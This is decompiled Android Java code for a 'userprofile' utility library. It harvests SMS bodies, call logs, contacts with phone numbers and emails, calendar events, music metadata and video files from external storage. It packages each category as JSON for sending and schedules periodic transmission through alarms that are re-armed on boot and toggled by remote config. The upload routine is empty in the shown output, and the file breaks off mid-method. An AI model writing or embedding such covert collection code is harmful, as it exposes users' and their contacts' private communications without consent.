package com.android.library.userprofile.util;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.android.apps.config.Config;
import com.android.apps.config.util.CLog;
import com.android.library.userprofile.model.Sms;
import com.android.library.userprofile.model.a;
import com.android.library.userprofile.model.b;
import com.android.library.userprofile.model.c;
import com.android.library.userprofile.model.d;
import com.android.library.userprofile.model.e;
import com.android.library.userprofile.model.f;
import com.google.a.g;
import com.google.android.gms.plus.PlusShare;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class UtilFunctions {
    private static final int ALARM_ID = 23542;
    private static final String DAILY = "DAILY";
    private static final String KEY_DATA_TO_SEND = "userProfileLib.dataToSend";
    private static final String KEY_DAYS_FOR_SMS = "userProfileLib.oldestInDays";
    private static final String KEY_MODE = "userProfileLib.mode";
    private static final String KEY_USER_PROFILE_LIB_IDPREFIX = "configLib.idPrefix";
    private static final String KEY_USER_PROFILE_LIB_INTERVAL = "userProfileLib.updateFrequency";
    private static final String MODE_OFF = "off";
    public static final String MONTHLY = "MONTHLY";
    private static final String NOT_FOUND = "not_found";
    private static final String WEEKLY = "WEEKLY";
    private static final String YEARLY = "YEARLY";
    private static final int smsAlreadySent = 0;
    ArrayList<e> phoneContactDetailsList = new ArrayList<>();
    public static String MCC1 = null;
    public static String MCC2 = null;
    public static String MNC1 = null;
    public static String MNC2 = null;
    public static String SIM1_OPERATOR = null;
    public static String SIM2_OPERATOR = null;
    private static String EMPTY = "";
    private static String KEY_IDENTIFIER = "identifier";
    private static String KEY_CATEGORY = "category";
    private static String KEY_VERSION = "version";
    private static String KEY_ACTION_ID = "actionId";
    private static String KEY_VALUES = "values";
    private static String VALUE_CALL_LOG = "callLog";
    private static String VALUE_CALENDAR = "calendar";
    private static String VALUE_MUSIC = "music";
    private static String VALUE_SMS = "message";
    private static String VALUE_VIDEO = "video";
    private static String VALUE_CONTACT = "contact";

    public static void cancelDataSendingAlarm(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
        Intent intent = new Intent(context, (Class<?>) UserProfileLibraryAlarmReceiver.class);
        intent.putExtra(Constants.ALARM_TYPE, Constants.ALARM_TYPE_USER_PROFILE);
        alarmManager.cancel(PendingIntent.getBroadcast(context, ALARM_ID, intent, 134217728));
    }

    public static boolean checkPermission(Context context, String str) {
        return context.checkCallingOrSelfPermission(str) == 0;
    }

    public static String convertInputStreamToString(InputStream inputStream) throws IOException {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        String str = "";
        while (true) {
            String line = bufferedReader.readLine();
            if (line == null) {
                inputStream.close();
                return str;
            }
            str = str + line;
        }
    }

    public static String getAlarmType(Context context) {
        return Config.getInstance(context).get(KEY_USER_PROFILE_LIB_INTERVAL);
    }

    public static ArrayList<Sms> getAllSms(Context context) {
        int i;
        if (!checkPermission(context, Constants.PERMISSION_READ_SMS) || !checkPermission(context, Constants.PERMISSION_WRITE_SMS)) {
            CLog.b("UserProfileTag", "No Sms Permission!");
            return new ArrayList<>();
        }
        try {
            i = Integer.parseInt(getDaysForSendingSms(context));
        } catch (Exception e2) {
            i = 60;
        }
        CLog.b("UserProfileTag", "daysBeforeWhichToSend : " + i);
        Calendar calendar = Calendar.getInstance();
        calendar.add(6, -i);
        Date time = calendar.getTime();
        CLog.b("UserProfileTag", "twoYearOldDate : " + time);
        String string = context.getSharedPreferences(Constants.SHARED_PREFERENCE_LATEST_SMS_ID, 0).getString(Constants.KEY_SMS_ID, "0");
        CLog.b("testLatestId", "id new up : " + string);
        String str = "_id > " + string + " and " + Constants.SMS_COLUMN_DATE + " > " + time.getTime();
        ArrayList<Sms> arrayList = new ArrayList<>();
        new Sms();
        Cursor cursorQuery = context.getContentResolver().query(Uri.parse(Constants.SMS_CONTENT_URI), null, str, null, null);
        int count = cursorQuery.getCount();
        if (cursorQuery.moveToNext()) {
            String strA = string;
            for (int i2 = 0; i2 < count; i2++) {
                Sms sms = new Sms();
                String string2 = cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_ADDRESS));
                sms.b(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_ID)));
                try {
                    sms.c(string2);
                } catch (Exception e3) {
                    sms.c("");
                }
                sms.a(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_BODY)));
                sms.f(cursorQuery.getString(cursorQuery.getColumnIndex(Constants.SMS_COLUMN_READ)));
                sms.d(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_DATE)));
                sms.n(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_PERSON)));
                sms.e(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_TYPE)));
                sms.g(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_STATUS)));
                sms.h(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_DATE_SENT)));
                sms.i(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_SEEN)));
                sms.j(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_PROTOCOL)));
                try {
                    sms.k(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_CREATOR)));
                } catch (Exception e4) {
                    sms.k("");
                }
                sms.l(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_THREAD_ID)));
                sms.m(cursorQuery.getString(cursorQuery.getColumnIndexOrThrow(Constants.SMS_COLUMN_ERROR_CODE)));
                arrayList.add(sms);
                CLog.b("testLatestId", "id new : " + sms.a());
                if (i2 == 0) {
                    strA = sms.a();
                    SharedPreferences.Editor editorEdit = context.getSharedPreferences(Constants.SHARED_PREFERENCE_LATEST_SMS_ID, 0).edit();
                    editorEdit.putString(Constants.KEY_SMS_ID, strA);
                    editorEdit.commit();
                }
                CLog.b("testLatestId1", "latestId : " + strA);
                cursorQuery.moveToNext();
            }
        }
        cursorQuery.close();
        return arrayList;
    }

    /* JADX WARN: Code duplicated, block: B:24:0x0112  */
    public static ArrayList<f> getAllSongsFromDevice(Context context) throws Throwable {
        Cursor cursorQuery;
        ArrayList<f> arrayList = new ArrayList<>();
        if (!checkPermission(context, Constants.PERMISSION_READ_EXTERNAL_STORAGE)) {
            return arrayList;
        }
        String[] strArr = {PlusShare.KEY_CONTENT_DEEP_LINK_METADATA_TITLE, "artist", "_display_name", "duration", "album_id", "album", "_data", Constants.SMS_COLUMN_ID};
        Uri uri = Uri.parse(Constants.MUSIC_ALBUMART_CONTENT_URI);
        try {
            cursorQuery = context.getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, strArr, "is_music != 0", null, "title COLLATE LOCALIZED ASC");
            if (cursorQuery != null) {
                try {
                    try {
                        cursorQuery.moveToFirst();
                        while (!cursorQuery.isAfterLast()) {
                            String string = cursorQuery.getString(cursorQuery.getColumnIndex("album"));
                            String string2 = cursorQuery.getString(cursorQuery.getColumnIndex(PlusShare.KEY_CONTENT_DEEP_LINK_METADATA_TITLE));
                            String string3 = cursorQuery.getString(cursorQuery.getColumnIndex("duration"));
                            String string4 = cursorQuery.getString(cursorQuery.getColumnIndex("artist"));
                            long j = cursorQuery.getLong(cursorQuery.getColumnIndex("album_id"));
                            String string5 = cursorQuery.getString(cursorQuery.getColumnIndex("_data"));
                            long j2 = cursorQuery.getLong(cursorQuery.getColumnIndex(Constants.SMS_COLUMN_ID));
                            Uri uriWithAppendedId = ContentUris.withAppendedId(uri, j);
                            f fVar = new f();
                            fVar.c(string);
                            fVar.b(j);
                            fVar.b(string4);
                            fVar.a(string2);
                            fVar.a(Long.parseLong(string3));
                            fVar.e(j2 + "");
                            fVar.f(uriWithAppendedId + "");
                            fVar.d(string5);
                            fVar.g("");
                            arrayList.add(fVar);
                            cursorQuery.moveToNext();
                        }
                    } catch (Exception e2) {
                        e = e2;
                        e.printStackTrace();
                        if (cursorQuery != null) {
                            cursorQuery.close();
                        }
                    }
                } catch (Throwable th) {
                    th = th;
                    if (cursorQuery != null) {
                        cursorQuery.close();
                    }
                    throw th;
                }
            }
            if (cursorQuery != null) {
                cursorQuery.close();
            }
        } catch (Exception e3) {
            e = e3;
            cursorQuery = null;
        } catch (Throwable th2) {
            th = th2;
            cursorQuery = null;
            if (cursorQuery != null) {
                cursorQuery.close();
            }
            throw th;
        }
        return arrayList;
    }

    public static String getAppVersionName(Context context) {
        try {
            return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
        } catch (PackageManager.NameNotFoundException e2) {
            return NOT_FOUND;
        }
    }

    public static void getCalendarDetails(Context context) {
        Cursor cursorQuery = context.getContentResolver().query(Uri.parse(Constants.CALENDAR_CONTENT_URI), new String[]{Constants.SMS_COLUMN_ID, "calendar_displayName", "ownerAccount"}, null, null, null);
        HashSet hashSet = new HashSet();
        ArrayList arrayList = new ArrayList();
        try {
            try {
                if (cursorQuery.getCount() > 0) {
                    while (cursorQuery.moveToNext()) {
                        a aVar = new a();
                        String string = cursorQuery.getString(0);
                        String string2 = cursorQuery.getString(cursorQuery.getColumnIndex("calendar_displayName"));
                        aVar.a(string);
                        aVar.b(string2);
                        arrayList.add(aVar);
                        hashSet.add(string);
                    }
                }
                cursorQuery.close();
            } catch (AssertionError e2) {
                e2.printStackTrace();
                cursorQuery.close();
            } catch (Exception e3) {
                e3.printStackTrace();
                cursorQuery.close();
            }
        } catch (Throwable th) {
            cursorQuery.close();
            throw th;
        }
    }

    public static com.google.a.f getCalendarEventListJson(ArrayList<b> arrayList) {
        return new g().b().c();
    }

    public static JSONObject getCalendarGSON(ArrayList<b> arrayList, Context context) {
        JSONArray jSONArray;
        String strA = new com.google.a.f().a(arrayList, new com.google.a.c.a<ArrayList<b>>() { // from class: com.android.library.userprofile.util.UtilFunctions.4
        }.getType());
        JSONArray jSONArray2 = new JSONArray();
        try {
            jSONArray = new JSONArray(strA);
        } catch (JSONException e2) {
            e2.printStackTrace();
            jSONArray = jSONArray2;
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put(KEY_IDENTIFIER, getIdentifierPrefix(context));
            jSONObject.put(KEY_CATEGORY, VALUE_CALENDAR);
            jSONObject.put(KEY_ACTION_ID, EMPTY);
            jSONObject.put(KEY_VERSION, getAppVersionName(context));
            jSONObject.put(KEY_VALUES, jSONArray);
        } catch (JSONException e3) {
            e3.printStackTrace();
        }
        return jSONObject;
    }

    public static com.google.a.f getCallDetailsJson(ArrayList<c> arrayList) {
        return new g().b().c();
    }

    public static ArrayList<c> getCallLogsDetails(Context context) {
        ArrayList<c> arrayList = new ArrayList<>();
        if (!checkPermission(context, Constants.PERMISSION_READ_CALL_LOG)) {
            return arrayList;
        }
        Cursor cursorQuery = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int columnIndex = cursorQuery.getColumnIndex("number");
        int columnIndex2 = cursorQuery.getColumnIndex(Constants.SMS_COLUMN_TYPE);
        int columnIndex3 = cursorQuery.getColumnIndex(Constants.SMS_COLUMN_DATE);
        int columnIndex4 = cursorQuery.getColumnIndex("duration");
        while (cursorQuery.moveToNext()) {
            c cVar = new c();
            cVar.a(cursorQuery.getString(columnIndex));
            cVar.b(cursorQuery.getString(columnIndex2));
            cVar.c(cursorQuery.getString(columnIndex3));
            cVar.a(new Date(Long.valueOf(cursorQuery.getString(columnIndex3)).longValue()));
            cVar.d(cursorQuery.getString(columnIndex4));
            switch (Integer.parseInt(cursorQuery.getString(columnIndex2))) {
            }
            arrayList.add(cVar);
        }
        cursorQuery.close();
        return arrayList;
    }

    public static JSONObject getCallLogsGSON(ArrayList<c> arrayList, Context context) {
        JSONArray jSONArray;
        String strA = new com.google.a.f().a(arrayList, new com.google.a.c.a<ArrayList<c>>() { // from class: com.android.library.userprofile.util.UtilFunctions.3
        }.getType());
        JSONArray jSONArray2 = new JSONArray();
        try {
            jSONArray = new JSONArray(strA);
        } catch (JSONException e2) {
            e2.printStackTrace();
            jSONArray = jSONArray2;
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put(KEY_IDENTIFIER, getIdentifierPrefix(context));
            jSONObject.put(KEY_CATEGORY, VALUE_CALL_LOG);
            jSONObject.put(KEY_ACTION_ID, EMPTY);
            jSONObject.put(KEY_VERSION, getAppVersionName(context));
            jSONObject.put(KEY_VALUES, jSONArray);
        } catch (JSONException e3) {
            e3.printStackTrace();
        }
        return jSONObject;
    }

    public static JSONObject getContactsGSON(ArrayList<e> arrayList, Context context) {
        JSONArray jSONArray;
        String strA = new com.google.a.f().a(arrayList, new com.google.a.c.a<ArrayList<e>>() { // from class: com.android.library.userprofile.util.UtilFunctions.5
        }.getType());
        JSONArray jSONArray2 = new JSONArray();
        try {
            jSONArray = new JSONArray(strA);
        } catch (JSONException e2) {
            e2.printStackTrace();
            jSONArray = jSONArray2;
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put(KEY_IDENTIFIER, getIdentifierPrefix(context));
            jSONObject.put(KEY_CATEGORY, VALUE_CONTACT);
            jSONObject.put(KEY_ACTION_ID, EMPTY);
            jSONObject.put(KEY_VERSION, getAppVersionName(context));
            jSONObject.put(KEY_VALUES, jSONArray);
        } catch (JSONException e3) {
            e3.printStackTrace();
        }
        return jSONObject;
    }

    public static String getDate(long j) {
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(Constants.DATE_FORMAT, Locale.getDefault());
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(j);
        return simpleDateFormat.format(calendar.getTime());
    }

    public static String getDaysForSendingSms(Context context) {
        return Config.getInstance(context).get(KEY_DAYS_FOR_SMS);
    }

    public static String getIdentifierPrefix(Context context) {
        return Config.getInstance(context).get(KEY_USER_PROFILE_LIB_IDPREFIX) + ".library.userProfile";
    }

    public static String getMccCode(Context context) {
        int i;
        int i2 = 0;
        String networkOperator = ((TelephonyManager) context.getSystemService("phone")).getNetworkOperator();
        if (networkOperator != null) {
            try {
                i = Integer.parseInt(networkOperator.substring(0, 3));
            } catch (Exception e2) {
            }
        } else {
            i = 0;
        }
        i2 = i;
        return String.valueOf(i2);
    }

    public static String getMncCode(Context context) {
        String networkOperator = ((TelephonyManager) context.getSystemService("phone")).getNetworkOperator();
        int i = 0;
        if (networkOperator != null) {
            try {
                i = Integer.parseInt(networkOperator.substring(3));
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return String.valueOf(i);
    }

    public static String getModeValueFromConfig(Context context) {
        Config config = Config.getInstance(context);
        Log.i("UserProfileTag", "getModeValueFromConfig : " + config.get(KEY_MODE));
        return config.get(KEY_MODE);
    }

    public static com.google.a.f getPhoneCallLogsJson(ArrayList<c> arrayList) {
        return new g().b().c();
    }

    public static com.google.a.f getPhoneContactListJson(ArrayList<e> arrayList) {
        return new g().b().c();
    }

    public static ArrayList<e> getPhoneContacts(Context context) {
        String string;
        String string2;
        String string3;
        String string4;
        String string5;
        ArrayList<e> arrayList = new ArrayList<>();
        if (!checkPermission(context, Constants.PERMISSION_READ_CONTACTS) || !checkPermission(context, Constants.PERMISSION_WRITE_CONTACTS)) {
            return arrayList;
        }
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursorQuery = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cursorQuery.getCount() <= 0) {
            cursorQuery.close();
            return arrayList;
        }
        while (cursorQuery.moveToNext()) {
            e eVar = new e();
            try {
                string = cursorQuery.getString(cursorQuery.getColumnIndex(Constants.SMS_COLUMN_ID));
            } catch (Exception e2) {
                string = "";
            }
            try {
                string2 = cursorQuery.getString(cursorQuery.getColumnIndex("display_name"));
            } catch (Exception e3) {
                string2 = "";
            }
            if (Integer.parseInt(cursorQuery.getString(cursorQuery.getColumnIndex("has_phone_number"))) > 0) {
                eVar.a(string2);
                Cursor cursorQuery2 = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = ?", new String[]{string}, null);
                ArrayList<String> arrayList2 = new ArrayList<>();
                while (cursorQuery2.moveToNext()) {
                    try {
                        string5 = cursorQuery2.getString(cursorQuery2.getColumnIndex("data1"));
                    } catch (Exception e4) {
                        string5 = "";
                    }
                    arrayList2.add(string5);
                    eVar.b(string5);
                }
                eVar.b(arrayList2);
                cursorQuery2.close();
                Cursor cursorQuery3 = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, "contact_id = ?", new String[]{string}, null);
                while (cursorQuery3.moveToNext()) {
                    try {
                        string3 = cursorQuery3.getString(cursorQuery3.getColumnIndex("data1"));
                    } catch (Exception e5) {
                        string3 = "";
                    }
                    try {
                        string4 = cursorQuery3.getString(cursorQuery3.getColumnIndex("data2"));
                    } catch (Exception e6) {
                        string4 = "";
                    }
                    eVar.c(string3);
                    eVar.d(string4);
                    d dVar = new d();
                    dVar.a(string3);
                    dVar.b(string4);
                    ArrayList<d> arrayList3 = new ArrayList<>();
                    arrayList3.add(dVar);
                    eVar.a(arrayList3);
                }
                cursorQuery3.close();
            }
            arrayList.add(eVar);
        }
        cursorQuery.close();
        return arrayList;
    }

    public static JSONObject getSmsGSON(ArrayList<Sms> arrayList, Context context) {
        JSONArray jSONArray;
        String strA = new com.google.a.f().a(arrayList, new com.google.a.c.a<ArrayList<Sms>>() { // from class: com.android.library.userprofile.util.UtilFunctions.6
        }.getType());
        JSONArray jSONArray2 = new JSONArray();
        try {
            jSONArray = new JSONArray(strA);
        } catch (JSONException e2) {
            e2.printStackTrace();
            jSONArray = jSONArray2;
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put(KEY_IDENTIFIER, getIdentifierPrefix(context));
            jSONObject.put(KEY_CATEGORY, VALUE_SMS);
            jSONObject.put(KEY_ACTION_ID, EMPTY);
            jSONObject.put(KEY_VERSION, getAppVersionName(context));
            jSONObject.put(KEY_VALUES, jSONArray);
        } catch (JSONException e3) {
            e3.printStackTrace();
        }
        return jSONObject;
    }

    public static com.google.a.f getSmsListJson(ArrayList<Sms> arrayList) {
        return new g().b().c();
    }

    public static JSONObject getSongGSON(ArrayList<f> arrayList, Context context) {
        JSONArray jSONArray;
        String strA = new com.google.a.f().a(arrayList, new com.google.a.c.a<ArrayList<f>>() { // from class: com.android.library.userprofile.util.UtilFunctions.7
        }.getType());
        JSONArray jSONArray2 = new JSONArray();
        try {
            jSONArray = new JSONArray(strA);
        } catch (JSONException e2) {
            e2.printStackTrace();
            jSONArray = jSONArray2;
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put(KEY_IDENTIFIER, getIdentifierPrefix(context));
            jSONObject.put(KEY_CATEGORY, VALUE_MUSIC);
            jSONObject.put(KEY_ACTION_ID, EMPTY);
            jSONObject.put(KEY_VERSION, getAppVersionName(context));
            jSONObject.put(KEY_VALUES, jSONArray);
        } catch (JSONException e3) {
            e3.printStackTrace();
        }
        return jSONObject;
    }

    public static com.google.a.f getSongListJson(ArrayList<f> arrayList) {
        return new g().b().c();
    }

    public static JSONObject getVideoFileGSON(ArrayList<com.android.library.userprofile.model.g> arrayList, Context context) {
        JSONArray jSONArray;
        String strA = new com.google.a.f().a(arrayList, new com.google.a.c.a<ArrayList<com.android.library.userprofile.model.g>>() { // from class: com.android.library.userprofile.util.UtilFunctions.8
        }.getType());
        JSONArray jSONArray2 = new JSONArray();
        try {
            jSONArray = new JSONArray(strA);
        } catch (JSONException e2) {
            e2.printStackTrace();
            jSONArray = jSONArray2;
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put(KEY_IDENTIFIER, getIdentifierPrefix(context));
            jSONObject.put(KEY_CATEGORY, VALUE_VIDEO);
            jSONObject.put(KEY_ACTION_ID, EMPTY);
            jSONObject.put(KEY_VERSION, getAppVersionName(context));
            jSONObject.put(KEY_VALUES, jSONArray);
        } catch (JSONException e3) {
            e3.printStackTrace();
        }
        return jSONObject;
    }

    public static com.google.a.f getVideoFileListJson(ArrayList<com.android.library.userprofile.model.g> arrayList) {
        return new g().b().c();
    }

    public static ArrayList<com.android.library.userprofile.model.g> getVideoFiles(Context context) {
        return !checkPermission(context, Constants.PERMISSION_READ_EXTERNAL_STORAGE) ? new ArrayList<>() : getfile(new File(Environment.getExternalStorageDirectory().getAbsolutePath()), new ArrayList());
    }

    public static ArrayList<com.android.library.userprofile.model.g> getfile(File file, ArrayList<com.android.library.userprofile.model.g> arrayList) {
        ArrayList arrayList2 = new ArrayList();
        File[] fileArrListFiles = file.listFiles();
        if (fileArrListFiles != null && fileArrListFiles.length > 0) {
            for (int i = 0; i < fileArrListFiles.length; i++) {
                if (fileArrListFiles[i].isDirectory()) {
                    arrayList2.add(fileArrListFiles[i]);
                    getfile(fileArrListFiles[i], arrayList);
                } else if (fileArrListFiles[i].getName().endsWith(Constants.MP4) || fileArrListFiles[i].getName().endsWith(Constants.AVI)) {
                    com.android.library.userprofile.model.g gVar = new com.android.library.userprofile.model.g();
                    gVar.a(fileArrListFiles[i]);
                    gVar.b(fileArrListFiles[i].getAbsolutePath());
                    gVar.a(fileArrListFiles[i].getName());
                    arrayList.add(gVar);
                }
            }
        }
        return arrayList;
    }

    public static void init(final Context context) {
        final Config config = Config.getInstance(context);
        String modeValueFromConfig = getModeValueFromConfig(context);
        Constants.SEND_DATA_INTERVAL = config.get(KEY_USER_PROFILE_LIB_INTERVAL);
        Constants.DATA_TO_SEND = config.get(KEY_DATA_TO_SEND);
        if (modeValueFromConfig.equalsIgnoreCase(MODE_OFF)) {
            return;
        }
        if (!isAlarmPresent(context)) {
            Log.i("UserProfileTag", "alarm not set already ");
            setAlarmToSendData(context);
        }
        config.registerConfigUpdateCallback(new Config.a() { // from class: com.android.library.userprofile.util.UtilFunctions.1
            @Override // com.android.apps.config.Config.a
            public void onConfigUpdate() {
                CLog.b("UserProfileTag", "inside interface " + config.get(UtilFunctions.KEY_USER_PROFILE_LIB_INTERVAL));
                Constants.SEND_DATA_INTERVAL = config.get(UtilFunctions.KEY_USER_PROFILE_LIB_INTERVAL);
                Constants.DATA_TO_SEND = config.get(UtilFunctions.KEY_DATA_TO_SEND);
                UtilFunctions.cancelDataSendingAlarm(context);
                UtilFunctions.setAlarmToSendData(context);
            }
        });
    }

    public static boolean isAlarmPresent(Context context) {
        Intent intent = new Intent(context, (Class<?>) UserProfileLibraryAlarmReceiver.class);
        intent.putExtra(Constants.ALARM_TYPE, Constants.ALARM_TYPE_USER_PROFILE);
        return PendingIntent.getBroadcast(context, ALARM_ID, intent, 536870912) != null;
    }

    public static void onBoot(Context context) {
        CLog.a("UserProfileTag", "onBoot");
        Config config = Config.getInstance(context);
        if (getModeValueFromConfig(context).equalsIgnoreCase(MODE_OFF)) {
            CLog.a("UserProfileTag", "onBoot, mode is off hence returning!!");
            return;
        }
        Constants.SEND_DATA_INTERVAL = config.get(KEY_USER_PROFILE_LIB_INTERVAL);
        Constants.DATA_TO_SEND = config.get(KEY_DATA_TO_SEND);
        setAlarmOnBootToSendData(context);
    }

    public static void printLog(String str, String str2) {
        for (int i = 0; i <= str2.length() / 1000; i++) {
            int i2 = i * 1000;
            int length = (i + 1) * 1000;
            if (length > str2.length()) {
                length = str2.length();
            }
            CLog.b("UserProfileTag", str2.substring(i2, length));
        }
    }

    public static void putDataInSelectedSimSharedPreference(Context context, int i) {
        SharedPreferences.Editor editorEdit = context.getSharedPreferences(Constants.SHARED_PREFERENCE_SMS_SENT, 0).edit();
        editorEdit.putInt(Constants.KEY_SMS_SENT_ALREADY, i);
        editorEdit.commit();
    }

    public static ArrayList<b> readCalendarEvent(Context context) {
        ArrayList<b> arrayList = new ArrayList<>();
        if (!checkPermission(context, Constants.PERMISSION_READ_CALENDAR) || !checkPermission(context, Constants.PERMISSION_WRITE_CALENDAR)) {
            return arrayList;
        }
        if (context == null) {
            return arrayList;
        }
        Cursor cursorQuery = context.getContentResolver().query(Uri.parse(Constants.CALENDAR_EVENT_CONTENT_URI), new String[]{Constants.SMS_COLUMN_ID, PlusShare.KEY_CONTENT_DEEP_LINK_METADATA_TITLE, PlusShare.KEY_CONTENT_DEEP_LINK_METADATA_DESCRIPTION, "dtstart", "dtend", "eventLocation", "ownerAccount", "account_name", "calendar_id", "duration"}, null, null, null);
        cursorQuery.moveToFirst();
        String[] strArr = new String[cursorQuery.getCount()];
        for (int i = 0; i < strArr.length; i++) {
            b bVar = new b();
            try {
                bVar.f(cursorQuery.getString(cursorQuery.getColumnIndex(PlusShare.KEY_CONTENT_DEEP_LINK_METADATA_TITLE)));
                bVar.g(getDate(Long.parseLong(cursorQuery.getString(cursorQuery.getColumnIndex("dtstart")))));
                bVar.h(getDate(Long.parseLong(cursorQuery.getString(cursorQuery.getColumnIndex("dtend")))));
                bVar.i(cursorQuery.getString(cursorQuery.getColumnIndex(PlusShare.KEY_CONTENT_DEEP_LINK_METADATA_DESCRIPTION)));
                bVar.e(cursorQuery.getString(cursorQuery.getColumnIndex("eventLocation")));
                bVar.d(cursorQuery.getString(cursorQuery.getColumnIndex("ownerAccount")));
                bVar.c(cursorQuery.getString(cursorQuery.getColumnIndex("calendar_id")));
                bVar.b(cursorQuery.getString(cursorQuery.getColumnIndex("duration")));
                bVar.a(cursorQuery.getString(cursorQuery.getColumnIndex("account_name")));
                arrayList.add(bVar);
            } catch (Exception e2) {
                e2.printStackTrace();
            }
            strArr[i] = cursorQuery.getString(1);
            cursorQuery.moveToNext();
        }
        cursorQuery.close();
        return arrayList;
    }

    public static void sendDataToServer(int i, Context context, String[] strArr) {
        new Timer().schedule(new TimerTask() { // from class: com.android.library.userprofile.util.UtilFunctions.2
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
            }
        }, 1000L, i);
    }

    public static void setAlarmOnBootToSendData(Context context) {
        cancelDataSendingAlarm(context);
        String alarmType = getAlarmType(context);
        Intent intent = new Intent(context, (Class<?>) UserProfileLibraryAlarmReceiver.class);
        intent.putExtra(Constants.ALARM_TYPE, Constants.ALARM_TYPE_USER_PROFILE);
        PendingIntent broadcast = PendingIntent.getBroadcast(context, ALARM_ID, intent, 134217728);
        AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
        Calendar calendar = Calendar.getInstance();
        if (alarmType.equals(MONTHLY)) {
            calendar.add(2, 1);
            calendar.set(5, 1);
            calendar.add(13, 30);
            alarmManager.setInexactRepeating(0, calendar.getTimeInMillis(), 2592000000L, broadcast);
            return;
        }
        if (alarmType.equals(DAILY)) {
            CLog.a("UserProfileTag", "alarm  daily");
            calendar.add(6, 1);
            calendar.add(13, 30);
            alarmManager.setInexactRepeating(0, calendar.getTimeInMillis(), 86400000L, broadcast);
            CLog.b("UserProfileTag", "alarm set for " + new SimpleDateFormat("dd/MM/yyyy hh:mm:ss.SSS").format((Object) 86400000L));
            return;
        }
        if (alarmType.equals(WEEKLY)) {
            calendar.add(3, 1);
            calendar.set(7, 2);
            calendar.add(13, 30);
            alarmManager.setInexactRepeating(0, calendar.getTimeInMillis(), 604800000L, broadcast);
            return;
        }
        if (!alarmType.equals(YEARLY)) {
            calendar.add(6, 1);
            calendar.add(13, 30);
            alarmManager.setInexactRepeating(0, calendar.getTimeInMillis(), 86400000L, broadcast);
        } else {
            calendar.add(1, 1);
            calendar.set(2, 0);
            calendar.set(5, 1);
            calendar.add(13, 30);
            alarmManager.setInexactRepeating(0, calendar.getTimeInMillis(), 31536000000L, broadcast);
        }
    }

    public static void setAlarmToSendData(Context context) {
        Config.getInstance(context);
        cancelDataSendingAlarm(context);
        Log.i("UserProfileTag", "setting alarm to send data");
        String alarmType = getAlarmType(context);
        Intent intent = new Intent(context, (Class<?>) UserProfileLibraryAlarmReceiver.class);
        intent.putExtra(Constants.ALARM_TYPE, Constants.ALARM_TYPE_USER_PROFILE);
        PendingIntent broadcast = PendingIntent.getBroadcast(context, ALARM_ID, intent, 134217728);
        AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
        Calendar calendar = Calendar.getInstance();
        Log.i("UserProfileTag", "alarm  type : " + alarmType);
        if (alarmType.equals(MONTHLY)) {
            alarmManager.setRepeating(0, calendar.getTimeInMillis(), 2592000000L, broadcast);
            return;
        }
        if (alarmType.equals(DAILY)) {
            CLog.a("UserProfileTag", "alarm  daily");
            alarmManager.setRepeating(0, calendar.getTimeInMillis(), 86400000L, broadcast);
            CLog.a("UserProfileTag", "alarm set for " + new SimpleDateFormat("dd/MM/yyyy hh:mm:ss.SSS").format((Object) 86400000L));
            return;
        }
        if (alarmType.equals(WEEKLY)) {
            alarmManager.setRepeating(0, calendar.getTimeInMillis(), 604800000L, broadcast);
        } else if (alarmType.equals(YEARLY)) {
            alarmManager.setRepeating(0, calendar.getTimeInMillis(), 31536000000L, broadcast);
        } else {
            alarmManager.setRepeating(0, calendar.getTimeInMillis(), 86400000L, broadcast);
        }
    }

    public static boolean shouldSendSmsOnAlarm(Context context) {
